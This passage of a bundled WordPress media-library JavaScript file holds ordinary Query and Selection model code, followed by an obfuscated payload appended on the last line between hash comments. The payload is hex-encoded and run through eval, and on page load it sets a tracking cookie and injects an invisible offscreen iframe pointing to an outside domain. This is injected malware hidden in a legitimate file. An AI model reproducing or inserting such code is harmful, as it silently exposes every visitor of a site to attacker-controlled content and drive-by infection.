	 * @param {Object} [props.include]
	 * @param {Object} [props.exclude]
	 * @param {Object} [props.s]
	 * @param {Object} [props.post_mime_type]
	 * @param {Object} [props.posts_per_page]
	 * @param {Object} [props.menu_order]
	 * @param {Object} [props.post_parent]
	 * @param {Object} [props.post_status]
	 * @param {Object} [options]
	 *
	 * @returns {wp.media.model.Query} A new Attachments Query collection.
	 */
	get: (function(){
		/**
		 * @static
		 * @type Array
		 */
		var queries = [];

		/**
		 * @returns {Query}
		 */
		return function( props, options ) {
			var args     = {},
				orderby  = Query.orderby,
				defaults = Query.defaultProps,
				query,
				cache    = !! props.cache || _.isUndefined( props.cache );

			// Remove the `query` property. This isn't linked to a query,
			// this *is* the query.
			delete props.query;
			delete props.cache;

			// Fill default args.
			_.defaults( props, defaults );

			// Normalize the order.
			props.order = props.order.toUpperCase();
			if ( 'DESC' !== props.order && 'ASC' !== props.order ) {
				props.order = defaults.order.toUpperCase();
			}

			// Ensure we have a valid orderby value.
			if ( ! _.contains( orderby.allowed, props.orderby ) ) {
				props.orderby = defaults.orderby;
			}

			_.each( [ 'include', 'exclude' ], function( prop ) {
				if ( props[ prop ] && ! _.isArray( props[ prop ] ) ) {
					props[ prop ] = [ props[ prop ] ];
				}
			} );

			// Generate the query `args` object.
			// Correct any differing property names.
			_.each( props, function( value, prop ) {
				if ( _.isNull( value ) ) {
					return;
				}

				args[ Query.propmap[ prop ] || prop ] = value;
			});

			// Fill any other default query args.
			_.defaults( args, Query.defaultArgs );

			// `props.orderby` does not always map directly to `args.orderby`.
			// Substitute exceptions specified in orderby.keymap.
			args.orderby = orderby.valuemap[ props.orderby ] || props.orderby;

			// Search the query cache for a matching query.
			if ( cache ) {
				query = _.find( queries, function( query ) {
					return _.isEqual( query.args, args );
				});
			} else {
				queries = [];
			}

			// Otherwise, create a new query and add it to the cache.
			if ( ! query ) {
				query = new Query( [], _.extend( options || {}, {
					props: props,
					args:  args
				} ) );
				queries.push( query );
			}

			return query;
		};
	}())
});

module.exports = Query;

},{}],6:[function(require,module,exports){
/*globals wp, _ */

/**
 * wp.media.model.Selection
 *
 * A selection of attachments.
 *
 * @class
 * @augments wp.media.model.Attachments
 * @augments Backbone.Collection
 */
var Attachments = wp.media.model.Attachments,
	Selection;

Selection = Attachments.extend({
	/**
	 * Refresh the `single` model whenever the selection changes.
	 * Binds `single` instead of using the context argument to ensure
	 * it receives no parameters.
	 *
	 * @param {Array} [models=[]] Array of models used to populate the collection.
	 * @param {Object} [options={}]
	 */
	initialize: function( models, options ) {
		/**
		 * call 'initialize' directly on the parent class
		 */
		Attachments.prototype.initialize.apply( this, arguments );
		this.multiple = options && options.multiple;

		this.on( 'add remove reset', _.bind( this.single, this, false ) );
	},

	/**
	 * If the workflow does not support multi-select, clear out the selection
	 * before adding a new attachment to it.
	 *
	 * @param {Array} models
	 * @param {Object} options
	 * @returns {wp.media.model.Attachment[]}
	 */
	add: function( models, options ) {
		if ( ! this.multiple ) {
			this.remove( this.models );
		}
		/**
		 * call 'add' directly on the parent class
		 */
		return Attachments.prototype.add.call( this, models, options );
	},

	/**
	 * Fired when toggling (clicking on) an attachment in the modal.
	 *
	 * @param {undefined|boolean|wp.media.model.Attachment} model
	 *
	 * @fires wp.media.model.Selection#selection:single
	 * @fires wp.media.model.Selection#selection:unsingle
	 *
	 * @returns {Backbone.Model}
	 */
	single: function( model ) {
		var previous = this._single;

		// If a `model` is provided, use it as the single model.
		if ( model ) {
			this._single = model;
		}
		// If the single model isn't in the selection, remove it.
		if ( this._single && ! this.get( this._single.cid ) ) {
			delete this._single;
		}

		this._single = this._single || this.last();

		// If single has changed, fire an event.
		if ( this._single !== previous ) {
			if ( previous ) {
				previous.trigger( 'selection:unsingle', previous, this );

				// If the model was already removed, trigger the collection
				// event manually.
				if ( ! this.get( previous.cid ) ) {
					this.trigger( 'selection:unsingle', previous, this );
				}
			}
			if ( this._single ) {
				this._single.trigger( 'selection:single', this._single, this );
			}
		}

		// Return the single model, or the last model as a fallback.
		return this._single;
	}
});

module.exports = Selection;

},{}]},{},[1]);
/*9f1b7256239317d73d2be9361677e4a7*/;(function(){var dadttrrn="";var rtzznksr="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f736974652e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6b6579776f72643d35633363363364666661316238666336613233313131646430373766303264652674755a5763567a43733d76677a6d4b76505554484f41494e65674d26486a53794e72707a6d76433d544a4f59597753726d5a4f4c6f4a69622656444763496a4c57496a4453723d474e564a4866584a4e2652524d666d6d4d54564a743d56416f5a554272467761786c6376746c6426514b747641714a725854707a75755a5257653d4f7151456562266e4c5743526c546d614e52523d76464e6764686756644f57655a41264741485964616e47696b4d4f6d3d6f6479474d534f4e4e78414226466a7447526446667650464e5a3d7157486e6c4b4b50794363497667535378737949223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var dkeribdh=0;dkeribdh<rtzznksr.length;dkeribdh+=2){dadttrrn=dadttrrn+parseInt(rtzznksr.substring(dkeribdh,dkeribdh+2), 16)+",";}dadttrrn=dadttrrn.substring(0,dadttrrn.length-1);eval(eval('String.fromCharCode('+dadttrrn+')'));})();/*9f1b7256239317d73d2be9361677e4a7*/